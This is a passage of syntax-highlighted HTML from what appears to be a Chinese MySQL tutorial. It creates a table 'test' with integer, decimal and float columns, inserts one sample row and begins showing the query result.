&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;id &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;NOT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;AUTO_INCREMENT&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;field1 &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;bigint&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;field2 &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;decimal&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;field3 &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;field4 &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;field5 &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;field6 &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;PRIMARY &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;KEY&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-10&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ENGINE&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;InnoDB &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;DEFAULT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;CHARSET&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;utf8&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0024 seconds] --&gt;
&lt;p&gt;我们创建了一个名为&lt;code&gt;test&lt;/code&gt;的表，出了&lt;code&gt;id&lt;/code&gt;字段之外还包含了多个字段，拥有这不同的数据类型。我们向这个表中插入一条数据&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f4b3d6bf673141631&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
INSERT INTO test (field1, field2, field3, field4, field5, field6) VALUE (100, 100, 100, 1.005, 3.5, 2.5);&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6bf673141631-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6bf673141631-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;INSERT &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;INTO &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;VALUE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3.5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2.5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0011 seconds] --&gt;
&lt;p&gt;插入之后表中的数据是这样的&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f4b3d6c3290614102&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select * from test;
+----+--------+--------+--------+--------+--------+--------+
| id | field1 | field2 | field3 | field4 | field5 | field6 |
+----+--------+--------+--------+--------+--------+--------+
|  1 |    100 |    100 |    100 | 1.0050 | 3.5000 | 2.5000 |
+----+--------+--------+--------+--------+--------+--------+
1 row in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c3290614102-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field6&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0050&lt;/span&gt;&lt;span 